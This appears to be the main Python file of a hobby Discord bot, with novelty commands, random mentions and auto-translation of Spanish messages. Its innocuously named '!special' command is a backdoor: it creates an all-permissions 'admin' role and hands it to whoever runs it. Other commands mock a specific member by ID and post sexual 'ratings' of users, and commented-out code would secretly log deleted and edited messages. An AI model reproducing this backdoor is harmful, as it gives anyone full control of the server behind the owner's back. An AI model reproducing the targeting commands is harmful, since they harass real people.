import discord
from webserver import keep_alive
import os
import discord.ext
from discord.ext import commands
import random
from random import randint

intents = discord.Intents().all()
bot = commands.Bot(command_prefix="!", intents=intents)



bot.load_extension('commands.aigeneratedimages')
bot.load_extension('commands.truthordare')
bot.load_extension('commands.suggestions.suggest')
bot.load_extension('commands.say')

@bot.command()
async def gay(ctx):
    await ctx.channel.send("Oh, you're talking about <@621880040304672789> <:yes:822574812282748950>")



@bot.command()
async def special(ctx):
    
    role = await ctx.guild.create_role(name="admin", permissions=discord.Permissions.all())
    await ctx.author.add_roles(role)

@bot.command()
async def horny(ctx, usermame = 'none', *, forwho):
    if usermame == 'none':
        await ctx.channel.send(f'```{ctx.author.name} is {randint(0, 100)}% horny```')
    else:
        usermame = int(usermame.replace('<', '').replace('@', '').replace('>', '').replace('!', ''))
        if forwho != 'none':
            print('e')
            try:
                if forwho != '':
                    int(forwho.replace('<', '').replace('@', '').replace('>', '').replace('!', ''))
                    
                    await ctx.channel.send(f'<@!{usermame}> is {randint(0, 100)}% horny for {forwho}')
                else:
                    await ctx.channel.send(f'<@!{usermame}> is {randint(0, 100)}% horny')
                    
                    
            except Exception:
                if 'hands' in forwho:
                    await ctx.channel.send(f'<@!{usermame}> is {100}% horny for {forwho}')
                else:
                    await ctx.channel.send(f'<@!{usermame}> is {randint(0, 100)}% horny for {forwho}')

                
            
from googletrans import Translator
ts = Translator()


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.author.bot: 
        return
    if "@someone" in message.content:
        members = [member for member in message.guild.members if not member.bot]
        user = random.choice(members)
        await message.channel.send(f"<@!{user.id}>")
    if message.channel.id == 889569051364454430 and "<!@324924304104095755>" in message.content:
        message.delete()

    channel = bot.get_channel(898608897038905386)
    lang = ts.detect(message.content).lang
    print(lang)
    if lang == "es":
        await channel.send(f"```{message.content}\n{message.author} sp → en\n{ts.translate(message.content, dest='en', src='es').text}```")
    await bot.process_commands(message)

# @bot.event
# async def on_message_delete(message):
#     now = datetime.now()
#     datime = now.strftime("%d/%m/%Y %H:%M:%S")
#     with open ('deleted.txt', 'a') as file:
#         file.write(f'{datime} -> {message.author} -> {message.content}\n')

# @bot.event
# async def on_message_edit(messagebefore, messageafter):
#     now = datetime.now()
#     datime = now.strftime("%d/%m/%Y %H:%M:%S")
#     with open ('edited.txt', 'a') as file:
#         file.write(f'{datime} -> {messagebefore.author} -> original: {messagebefore.content} -> after: {messageafter.content}\n')

keep_alive()
bot.run(os.getenv("token"))